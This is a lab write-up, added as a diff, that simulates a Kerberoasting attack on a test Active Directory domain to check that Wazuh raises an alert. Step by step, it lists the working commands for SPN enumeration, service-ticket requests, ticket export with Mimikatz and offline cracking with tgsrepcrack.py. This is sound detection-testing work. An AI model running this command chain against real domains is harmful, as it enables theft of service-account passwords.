@@ -1,0 +1,40 @@
+Kerberoasting Attack Simulation
+To simulate a common Active Directory attack targeting service accounts and verify that Wazuh detects suspicious ticket requests.
+Tools Used:
+•	Python tgsrepcrack.py script
+•	Windows Domain (WinServ.local)
+•	Password list including known service account password
+Steps Performed:
+Prepare Environment
+  • Ensure Windows endpoint is joined to the domain WinServ.local.
+  • Use a service account for the simulation.
+  • Ensure Python is installed on the endpoint to run tgsrepcrack.py.
+Steps and Commands Executed :
+1.	Run GetUserSPNs script to enumerate service accounts
+-	Lists all accounts with Service Principal Names (SPNs) that can be targeted for offline password attacks. Helps identify high-value accounts such as service accounts.
+.\GetUserSPNs.ps1
+
+ 
+2.	Load required .NET assemblies for Kerberos request
+-	Prepares PowerShell to create Kerberos tokens, simulating legitimate Kerberos authentication requests.
+Add-Type -AssemblyName System.IdentityModel
+
+3.	Trigger Kerberos request using a service principal name (SPN)
+-	Requests a service ticket for the specified SPN.
+This command triggered the Wazuh alert with rule.description: Possible Keberoasting attack.
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.sfm.local"
+
+4.	Export Kerberos tickets from memory (Mimikatz)
+-	Saves TGS tickets for offline analysis and cracking. Simulates the process an attacker uses to steal tickets without directly accessing the password.
+kerberos::list /export
+
+ 
+
+5.	Check exported ticket files in local directory
+-	Ensures tickets are correctly exported and available for further testing or offline attacks.
+Get-ChildItem C:\Tools\mimikatz\*.kirbi
+
+ 
+6.	Attempt offline password cracking using tgsrepcrack.py
+-	Uses the exported TGS ticket to attempt offline recovery of the account password. Simulates real-world Kerberoasting attacks in a controlled lab environment
+./tgsrepcrack.py password.txt 1-40a10000-Administraor@HTTP~webserver.sfm.local-WINSERV.LOCAL.kirbi
